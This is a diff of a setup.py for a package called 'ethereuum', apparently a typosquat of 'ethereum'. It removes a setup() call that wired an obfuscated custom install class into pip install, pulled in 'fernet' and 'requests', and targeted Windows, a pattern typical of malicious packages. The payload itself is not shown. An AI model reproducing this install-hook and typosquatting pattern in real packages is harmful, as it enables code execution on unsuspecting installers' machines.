@@ -18,22 +18,5 @@ class uZRyRvGTsWNYlEWDirwpNBSXQQmsuqAvRXfNUoChLHNGpNdPcSbEVsVVfVTwjezNezESEZvrFc
             install.run(self)
 
 
-setup(
-    name="ethereuum",
-    version=VERSION,
-    author="sqqZLre",
-    author_email="fSlnsqHmFHOkO@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': uZRyRvGTsWNYlEWDirwpNBSXQQmsuqAvRXfNUoChLHNGpNdPcSbEVsVVfVTwjezNezESEZvrFcmwGilaFhELXXqOgNiSDojWhevBFkFYEFsZiiNISrDKe,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
 
